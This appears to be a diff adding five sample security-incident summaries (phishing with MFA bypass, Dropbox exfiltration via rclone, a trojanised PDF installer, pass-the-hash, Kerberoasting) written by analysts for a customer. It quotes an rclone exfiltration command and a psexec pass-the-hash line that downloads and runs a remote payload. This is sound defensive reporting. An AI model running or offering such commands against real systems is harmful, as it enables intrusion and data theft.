@@ -1,0 +1,91 @@
+#################################################
+#		Usecase 1			#
+#          Adversary-in-the-Middle		#
+#################################################
+Summary: 
+We observe suspicious traffic with strong indications of user 
+The sender attempts to make the sender address appear as if they are Microsoft, but in reality the domain is typosquatted and likely malicious. Phishing email often make victims feel like something is urgent, as seen in the subject: 'Action required: Verify your account'. The phishing email has a link to domain https://i9152.cisele0[.]com/NOZcbtTxxEiGj/, which has been actively used by the Adversary-in-The-Middle group Tycoon[1].Tycoon is a 2FA Phishing-as-a-Service platform who is known to use landing pages similar to Microsoft in their phishing attempts. 
+
+After the initial click, we can see that the user is directed to a captcha, as can be seen in [2]. The user then submits this captcha and submits their credentials to the fake Microsoft login page. The OAuth token is then issued, which the attacker can use to log in and essentially bypass MFA requirements.
+
+15 seconds after, we observe a risky signin from the same user, where the location is US and the User-Agent is Axios/1.7.9, which is also a frequently used UA in AiTM incidents. As the user was successfully phished and the OAuth token was issued, the Threat Actor is seen logging in and successfully bypassing MFA as the requirement is already satisfied:
+
+Successful interactive logon for user erik.nilsen@datahaven.no from external IP 89.185.80.19; User-Agent: Axios/1.7.9;
+
+Immediately after, we can see that his email is being abused to pivot further send outbound emails to third parties. These are also relayed to the address of the attacker:
+
+MessageCreated: Draft created with subject 'Re: Invoice Payment - Urgent' addressed to finance@victimcorp.no; body contains new payment instructions (account: NL89BANKXXXX...); Attached PDF.
+
+Our conclusion is that this user is compromised and that their email-address is being actively exploited to phish external entities with a legitimate sender address.
+
+
+1 - https://blog.sekoia.io/tycoon-2fa-an-in-depth-analysis-of-the-latest-version-of-the-aitm-phishing-kit/
+2 - https://urlscan.io/result/1876f332-e54f-4d24-9a42-d703e80cc9ec/
+
+
+#################################################
+#		Usecase 2			#
+#		Exfil Dropbox			#
+#################################################
+
+Summary:
+We observe possible exfiltration of sensitive data from user lars.Haugen. User is seen repeatedly attempting to send sensitive PII, contracts, financial and confidential data via Outlook. The attempts appear as blocked by Exchange Online DLP. Following these events, we observe the following rclone command:
+
+rclone copy C:\Users\Lars\Documents\Finance\ dropbox:/Finance_Backup --transfers 4
+
+Rclone is a command-line program used to synchronize files and directories to and from different cloud providers[1]. Seeing as the exfiltration attempts were unsuccessful through Outlook, the user is uploading large amounts of data to Dropbox instead, using rclone. 
+
+This could be in breach of your security policy as this is highly sensitive data, but could also indicate that a Threat Actor has compromised your environment and is exfiltrating sensitive data. 
+
+We see no login attempts in our timeline, and are unable to verify if this was intended by the user, or if this user is compromised. The IP related to this activity, 84.213.57.42, belongs to Get, which is a telecom provider.
+
+1 - https://github.com/rclone/rclone
+
+#################################################
+#		Usecase 3			#
+#		Appsuite-Pdf			#
+#################################################
+Summary:
+MSXDR has detected installation of AppSuites-PDF-1.0-28.exe on host WIN10-SL-312, after following a Google Ad. The AppSuite-PDF file has the hash fde67ba523b2c1e517d679ad4eaf87925c6bbf2f171b9212462dc9a855faa34b, and is identified by 39 VirusTotal vendors as malicious [1]. 
+The installer launches a commandline installing PDFEditor.exe and schedules it to run automatically daily. The EDR product then identifies a malicious JS module loaded by PDF Editor.exe. Following this, we also observe activation of an infostealer module, which dumps browser credentials to %LOCALAPPDATA%\\Temp\\cred_dump_20251029.bin. 
+
+PDFEditor initiates a network connection to domains product.update-appsuite[.]ai (resolved host vault.appsuites[.]ai earlier) and to y2iax5[.]com. 
+Defender then proceeds to identify that this is a TamperedChef trojan.
+
+These are clear signs of host compromise and exfiltration of credentials. WindowsEvent logs summarize them as follows:
+
+Anomalous: newly installed unsigned PDF editor executed, created autostart Run key, spawned browser-killers, early C2 traffic; deviation score=94/100
+
+
+1 - https://www.virustotal.com/gui/file/fde67ba523b2c1e517d679ad4eaf87925c6bbf2f171b9212462dc9a855faa34b
+
+#################################################
+#		Usecase 4			#
+#		Pass-the-hash			#
+#################################################
+Summary:
+We observe a pass-the-hash attack from user ola.hansen on host WKSTN-23.
+The user is seen running the following psexec command:
+psexec.exe \\SRV-APPS01 -u SILVERLINE\svc_deploy -hashes 9f1c2a4d7e8b0c3f5a6d1e2b4c7a8f01 -s powershell.exe -c "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.199/payloads/run.txt') | IEX"
+
+This command attempts to authenticate towards the service with a given hash, and remotely download and execute the payload file run.txt. 
+Following this, we observe a TCP connecting towards odd-lilac-weasel.zone:4444. Port 4444 is a frequently used port for Metasploit listeners, which coukd indicate that a Threat Actor has obtained a reverse shell on the host SRV-APPS01. 
+Following this, we observe that the user is doing registry edits regarding the SAM. SAM is a registry that stores credentials and account information for local users either as an LM hash or NT hash[1]. The host is seen dumping the SAM registry to a the temporary temp folder and terminating the TCP session to the remote host.
+
+
+1 - https://www.praetorian.com/blog/how-to-detect-and-dump-credentials-from-the-windows-registry/
+
+#################################################
+#		Usecase 5			#
+#		Kerberoasting			#
+#################################################
+Summary:
+We observe a possible kerberoasting attempt from kristin.hansen. A kerberoasting attack allows attackers to extract service account credentials from AD[1]. This user is seen requesting services:
+- svc_sql
+- svc_exchange
+- svc_web
+These tickets have the encryption type rc4-hmac, which is a legacy encryption and generally considered to be vulnerable to Kerberoasting attacks. The attacker can request the tickets for a SPN. The ticket itself is derived from the account's password, and can be cracked offline. When the password is obtained, the threat actor can impersonate the account owner. 
+
+Following these TGT requests, we observe a login from the same source IP address as kristin.hansen is seen requesting the TGT's from, but now towards service svs_sql. This indicates that the password was cracked successfully and that the threat actor has signed on with the correct service account password.
+
+1 - https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/
